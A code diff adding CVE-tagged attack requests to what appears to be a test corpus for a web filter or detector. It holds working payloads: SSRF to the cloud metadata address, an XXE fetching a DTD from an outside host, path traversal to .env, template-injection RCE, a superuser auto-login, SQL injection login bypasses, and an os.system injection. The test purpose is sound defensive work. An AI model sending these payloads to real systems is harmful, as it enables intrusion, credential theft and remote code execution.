@@ -934,6 +934,33 @@ POST /api/pull header="Content-Type: application/json" body="{\"name\":\"../../.
 POST /run_script header="Content-Type: application/json" body="{\"script\":\"__import__('os').system('id')\"}"
 POST /api/json/user/password/update/ header="Content-Type: application/json" body="{\"username\":\"admin\",\"password\":\"newpass\"}"
 
+# --- CVE-2026-111663 (Chaskiq) and CVE-2026-111313 (JobOps): server-side
+#     request forgery where the request body carries the internal URL that the
+#     ssrf category rejects. ---
+POST /graphql header="Content-Type: application/json" body="{\"query\":\"mutation{createUrlUpload(url:\\\"http://169.254.169.254/latest/meta-data/\\\"){url}}\"}"
+POST /api/manual-jobs/fetch header="Content-Type: application/json" body="{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
+
+# --- CVE-2026-109430 (Ellucian WebAdvisor): unauthenticated XXE through the
+#     /WebAdvisor/WebAdvisor XML endpoint. ---
+POST /WebAdvisor/WebAdvisor header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><!DOCTYPE r [ <!ENTITY % p SYSTEM \"http://198.51.100.7/x.dtd\"> %p; ]><r>&xxe;</r>"
+
+# --- CVE-2026-62679 (Lychee): encoded traversal in the GET /image/{path}
+#     handler defeats the prefix check before canonicalization. ---
+GET /image/..%2f..%2f..%2f..%2f.env
+
+# --- CVE-2026-111687 (WeRSS / we-mp-rss): unauthenticated SSTI RCE through the
+#     template parameter of the public /rss/{feed_id} endpoint. ---
+GET /rss/1?ext=on&template=%7B%7B%3D%20Object.constructor.constructor('return%20process')()%7D%7D
+
+# --- CVE-2026-111641 (FastapiAdmin): the unprotected auto-login endpoints let
+#     anyone list users and mint a superuser session. ---
+GET /api/v1/auth/auto-login/users
+
+# --- CVE-2026-110911 / CVE-2026-111444 (Wheels): dynamic finders re-parse
+#     caller-supplied quoted values as SQL so a doubled quote breaks out. ---
+GET /users?email=x%27%27%20OR%201%3D1--
+POST /users/login header="Content-Type: application/x-www-form-urlencoded" body="email=admin%27%27%20OR%20%271%27%3D%271&password=x"
+
 # Classes that still need connection-level framing, a malicious upstream, or
 # configuration-specific state; no request line can express them.
 # CVE-2026-42533 (nginx): the HTTP variant needs a regex map and regex location
